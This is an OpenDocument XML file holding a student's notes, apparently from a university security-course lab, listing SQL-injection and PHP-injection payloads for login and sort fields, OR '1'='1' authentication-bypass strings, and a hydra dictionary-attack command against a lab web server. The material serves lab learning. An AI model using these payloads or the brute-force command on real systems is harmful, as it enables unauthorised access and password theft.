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Neue" fo:font-size="12pt" fo:letter-spacing="normal" style:letter-kerning="false" style:font-size-asian="12pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" style:text-outline="false" style:font-name="HelveticaNeue" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-weight="normal" style:letter-kerning="false" style:font-size-asian="12pt" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00190a03" officeooo:paragraph-rsid="00190a03"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#000000" style:text-outline="false" style:font-name="HelveticaNeue" fo:font-size="12pt" fo:letter-spacing="normal" style:letter-kerning="false" style:font-size-asian="12pt"/>
    </style:style>
    <style:style style:name="T2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/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#000000" style:text-outline="false" style:font-name="HelveticaNeue" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-weight="normal" style:letter-kerning="false" style:font-size-asian="12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UIZA'S ATTEMPTS ~~~~ </text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Possible ways of getting the passwords:</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">trying SQL injection when we wanna sort the members page</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>-in the type variable</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">trying sql injection when trying to log in</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>-in the user variable</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>-in the pass variable</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>-in the login variable</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">trying sql injection when forgot password</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">try php code injection in all of the above</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">for the SQL injections…try:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>zzz’ UNION ALL SELECT database() #</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>zzz’ UNION ALL SELECT database() - - </text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>zzz” UNION ALL SELECT database() #</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>zzz” UNION ALL SELECT database()  - -</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>zzz”; $a = mysql_query(' UNION ALL SELECT database()</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"> ’); echo($a);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>zzz”; $a = mysql_query(' UNION ALL SELECT database()</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"> ’); print($a);</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">for the php injections just try substituting the variables for:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>echo(“whatever”);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1"><text:tab/>print(“whatever”);</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">————</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Online dictionary attack using hydra</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">command:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">hydra -L logins.txt -P american-english.txt http://comp535-lampvm2.cs.unc.edu http-post-form “/faq.php:user=^USER^&amp;pass=^PASS^&amp;login=Login:</text:span><text:span text:style-name="T2">Invalid username</text:span><text:span text:style-name="T3">” -V</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3">I keep getting this error:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3">[ERROR] optional parameter must start with a '/' slash!</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T3">dawid@lab:~$ hydra -L list_user -P list_password 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Login failed" -V</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T3">All attempts to change the call didnt work… </text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3">————</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3">Next attempt:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3">SQL INJECTION OF or 1=1 IN LOGIN</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>IN USER</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz‘ OR ‘1’=‘1'</text:span></text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:span text:style-name="T3"><text:tab/>zz“ OR ‘1’ = ‘1’</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz‘ OR ‘1’=‘1’ #</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz“ OR ‘1’ = ‘1’ #</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>IN PASSWORD</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz‘ OR ‘1’=‘1'</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz“ OR ‘1’ = ‘1’</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz‘ OR ‘1’=‘1’ #</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz“ OR ‘1’ = ‘1’ #</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>IN BOTH</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz‘ OR ‘1’=‘1'</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz“ OR ‘1’ = ‘1’</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz‘ OR ‘1’=‘1’ #</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T3"><text:tab/>zz“ OR ‘1’ = ‘1’ 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57:34.629936000</meta:creation-date>
    <dc:date>2016-04-12T08:58:28.594851000</dc:date>
    <meta:editing-duration>PT54S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="48" meta:word-count="238" meta:character-count="1516" meta:non-whitespace-character-count="1291"/>
    <meta:generator>LibreOffice/5.0.0.5$MacOSX_X86_64 LibreOffice_project/1b1a90865e348b492231e1c451437d7a15bb262b</meta:generator>
  </office:meta>
</office:document-meta>
</file>